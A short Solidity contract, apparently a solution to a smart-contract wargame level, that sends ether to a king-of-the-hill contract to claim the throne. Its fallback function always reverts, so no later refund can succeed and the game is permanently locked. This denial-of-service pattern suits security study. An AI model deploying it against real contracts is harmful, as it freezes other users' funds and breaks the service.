pragma solidity ^0.8.0;

contract King {

    function KingOfTheHill(address addr) public payable  {
        (bool result, bytes memory data) = addr.call{value:msg.value}("");
        if(!result) revert ("The kingOfKings function reverted");
    }

    fallback() external payable {
        revert("Its now broken");
    }

}